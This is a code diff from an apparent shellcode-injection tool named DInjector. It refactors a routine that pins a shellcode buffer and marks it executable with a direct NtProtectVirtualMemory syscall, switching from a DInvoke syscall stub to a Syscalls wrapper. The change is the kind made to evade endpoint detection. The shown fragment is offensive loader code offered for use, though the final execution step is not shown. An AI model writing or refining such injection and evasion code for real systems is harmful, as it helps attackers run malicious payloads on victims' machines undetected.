@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 using DI = DInvoke;
@@ -9,20 +8,10 @@ namespace DInjector
     class FunctionPointerV2
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            ref IntPtr RegionSize,
-            uint NewProtect,
-            out uint OldProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate void pFunction();
 
-        public static void Execute(byte[] shellcodeBytes)
+        public static void Execute(byte[] shellcode)
         {
-            var shellcode = shellcodeBytes;
-
             unsafe
             {
                 fixed (byte* ptr = shellcode)
@@ -31,19 +20,17 @@ namespace DInjector
 
                     #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)
 
-                    IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
-                    NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
+                    IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
                     IntPtr oldAddress = baseAddress;
                     IntPtr regionSize = (IntPtr)shellcode.Length;
-                    DI.Data.Native.NTSTATUS ntstatus;
+                    uint oldProtect = 0;
 
-                    ntstatus = sysNtProtectVirtualMemory(
-                        Process.GetCurrentProcess().Handle,
+                    var ntstatus = Syscalls.NtProtectVirtualMemory(
+                        hProcess,
                         ref baseAddress,
                         ref regionSize,
                         DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                        out uint _);
+                        ref oldProtect);
 
                     if (ntstatus == 0)
                         Console.WriteLine("(FunctionPointerV2) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
